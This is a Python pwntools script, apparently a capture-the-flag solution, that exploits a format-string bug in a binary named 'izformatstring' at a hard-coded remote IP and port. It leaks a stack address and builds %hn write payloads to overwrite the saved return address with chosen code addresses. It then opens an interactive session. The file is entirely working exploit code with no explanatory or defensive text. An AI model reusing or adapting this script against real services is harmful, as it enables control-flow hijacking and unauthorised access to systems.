from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./izformatstring')
	raw_input('debug')
else:
	host, port = '3.1.97.199', 13372
	r = remote(host, port)

def exploitFS(s, start, index, strformat):
	str1 = ""
	buf = ""
	for i in s[::-1]:
		if i == 'x':
			break
		str1 += i
	if len(str1)%2 != 0:
		str1 += '0'
	l = int(len(str1) /2)
	if strformat == 'hhn':
		for i in range(l):
			tmp = str1[i*2 +1] + str1[i*2]
			tmp2 = int(tmp, 16)
			if tmp2 < start:
				offset = tmp2 + 256  - start
				start = tmp2
			else:
				offset = tmp2 -start
				start = tmp2
			buf += '%' + str(offset) + 'x%' + str(index + i) + '$' + strformat
	elif strformat == 'hn':
		if l % 2 == 0:
			loop = int(l/2)
		else:
			loop = int(l/2) +1
		for i in range(loop):
			tmp = str1[i*4 +3] + str1[i*4 +2] + str1[i*4 +1] + str1[i*4]
			tmp2 = int(tmp, 16)
			if tmp2 < start:
				offset = tmp2 + 65536 - start
				start = tmp2
			else:
				offset = tmp2 -start
				start = tmp2
			buf += '%' + str(offset) + 'x%' + str(index + i) + '$' + strformat
	return buf, start

r.sendlineafter('$ ', '%27$p')
res = r.recv(14)
log.info(res)
return_add = int(res,16) - 0xe0

tmp = ''
start = 0
tmp, start = exploitFS('0x00400843', start, 16, 'hn')
payload = tmp
tmp, start = exploitFS('0x0000', start, 18, 'hn')
payload += tmp
tmp, start = exploitFS('0x0040073c', start, 19, 'hn')
payload += tmp
tmp, start = exploitFS('0x0000', start, 21, 'hn')
payload += tmp
payload = payload.ljust(80, 'a')
payload += p64(return_add) + p64(return_add + 2) + p64(return_add + 4)
payload+= p64(return_add + 8) + p64(return_add + 10) + p64(return_add + 12)

r.sendlineafter('$ ', payload)

r.interactive()
r.close()